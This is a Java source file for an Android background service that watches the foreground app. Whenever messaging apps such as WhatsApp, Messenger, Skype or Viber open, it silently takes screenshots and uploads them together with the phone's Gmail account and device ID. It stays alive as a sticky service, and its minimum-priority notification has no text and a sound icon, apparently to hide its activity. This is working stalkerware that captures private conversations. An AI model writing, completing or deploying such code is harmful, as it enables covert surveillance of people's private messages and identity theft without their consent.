package com.example.nayan.appanalysis2.forgroundApp;

import android.app.Notification;
import android.app.NotificationManager;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.Color;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.provider.Settings;
import android.support.annotation.Nullable;
import android.support.v4.app.NotificationCompat;
import android.view.View;

import com.example.nayan.appanalysis2.R;
import com.example.nayan.appanalysis2.activity.SubmitActivity;
import com.example.nayan.appanalysis2.database.DBManager;
import com.example.nayan.appanalysis2.model.MScreenshot;
import com.example.nayan.appanalysis2.tools.MainApplication;
import com.example.nayan.appanalysis2.tools.ScreenshotManager;
import com.example.nayan.appanalysis2.tools.Utils;

import java.util.ArrayList;

/**
 * Created by Dev on 12/31/2017.
 */

public class ForegroundToastService extends Service {

    private final static int NOTIFICATION_ID = 1234;
    private final static String STOP_SERVICE = ForegroundToastService.class.getPackage() + ".stop";

    private BroadcastReceiver stopServiceReceiver;
    private AppChecker appChecker;
    private ArrayList<MScreenshot> mScreenshots;
    private Notification notification;


    public static void start(Context context) {
        context.startService(new Intent(context, ForegroundToastService.class));
    }


    public static void stop(Context context) {
        context.stopService(new Intent(context, ForegroundToastService.class));
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

//        if (preferredProvider != null) {
//            mgr.requestLocationUpdates(preferredProvider, MIN_SECONDS * 1000,
//                    MIN_METRES, this);
        startForeground(NOTIFICATION_ID, notification);
        return START_STICKY;
//        }
//        return START_NOT_STICKY;
    }

//    @Override
//    public boolean onUnbind(Intent intent) {
//        mgr.removeUpdates();
//        return super.onUnbind(intent);
//    }

    @Override
    public void onCreate() {
        super.onCreate();
        registerReceivers();
        startChecker();
        createStickyNotification();
        mScreenshots = new ArrayList<>();

        SubmitActivity.getInstance().requestPermission();


    }

    @Override
    public void onDestroy() {
//        super.onDestroy();
//        stopChecker();
//        removeNotification();

        unregisterReceivers();

//        stopSelf();
    }

    private void startChecker() {

        appChecker = new AppChecker();
        appChecker
                .when(getPackageName(), new AppChecker.Listener() {
                    @Override
                    public void onForeground(String packageName) {

                    }
                })
                .whenOther(new AppChecker.Listener() {
                    @Override
                    public void onForeground(String packageName) {
                        if (packageName.equals("com.facebook.katana") || packageName.equals("com.google.android.talk") ||
                                packageName.equals("com.facebook.orca") || packageName.equals("com.imo.android.imoim") ||
                                packageName.equals("com.skype.raider") || packageName.equals("com.viber.voip") ||
                                packageName.equals("com.whatsapp")) {
                            if (android.os.Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                                ScreenshotManager.INSTANCE.takeScreenshot(getApplicationContext());
                                mScreenshots = DBManager.getInstance().getScreenshot();
                                String gmail = Utils.getPhoneGmailAcc(MainApplication.context);
                                String device = Utils.getDeviceId(MainApplication.context);
                                if (mScreenshots.size() > 0) {
                                    long id = mScreenshots.get(0).getId();
                                    Utils.log("imageName ", "sd card " + mScreenshots.get(0).getImgName());
                                    Utils.log("imageId ", "sd card " + mScreenshots.get(0).getId());
                                    if (Utils.isInternetOn())
                                        ScreenshotManager.INSTANCE.getImage(MainApplication.context, mScreenshots.get(0).getImgName(), gmail, device, id);
                                }

                            }
                            if (mScreenshots.size() > 0)
                                Utils.log("Image", " size " + mScreenshots.size() + " name" + mScreenshots.get(0).getImgName());
                        } else {
                            mScreenshots = DBManager.getInstance().getScreenshot();
                            String gmail = Utils.getPhoneGmailAcc(MainApplication.context);
                            String device = Utils.getDeviceId(MainApplication.context);
                            if (mScreenshots.size() > 0) {
                                long id = mScreenshots.get(0).getId();
                                Utils.log("imageName ", "sd card " + mScreenshots.get(0).getImgName());
                                Utils.log("imageId ", "sd card " + mScreenshots.get(0).getId());
                                if (android.os.Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                                    if (Utils.isInternetOn())
                                        ScreenshotManager.INSTANCE.getImage(MainApplication.context, mScreenshots.get(0).getImgName(), gmail, device, id);
                                }
                            }

                        }
                        Utils.log("Foreground: ", "app " + packageName);
//                        Utils.toastShow("Foreground " + packageName);
                    }
                })
                .timeout(20000)
                .start(this);
    }

    private void stopChecker() {
        appChecker.stop();
    }

    private void registerReceivers() {
        stopServiceReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                stopSelf();
            }
        };
        registerReceiver(stopServiceReceiver, new IntentFilter(STOP_SERVICE));
    }

    private void unregisterReceivers() {
        unregisterReceiver(stopServiceReceiver);
    }

    private Notification createStickyNotification() {
        NotificationManager manager = ((NotificationManager) getSystemService(NOTIFICATION_SERVICE));
        notification = new NotificationCompat.Builder(this)
                .setSmallIcon(R.drawable.sound_topbar)
                .setOngoing(true)
                .setOnlyAlertOnce(true)
                .setAutoCancel(false)
//                .setContentTitle(getString(R.string.app_name))
//                .setContentText(getString(R.string.stop_service))
//                .setContentIntent(PendingIntent.getBroadcast(this, 0, new Intent(STOP_SERVICE), PendingIntent.FLAG_UPDATE_CURRENT))
                .setWhen(0)
                .setPriority(Notification.PRIORITY_MIN)
                .build();
        manager.notify(NOTIFICATION_ID, notification);
        return notification;
    }

    public void removeNotification() {
        NotificationManager manager = ((NotificationManager) getSystemService(NOTIFICATION_SERVICE));
        manager.cancel(NOTIFICATION_ID);
    }


}
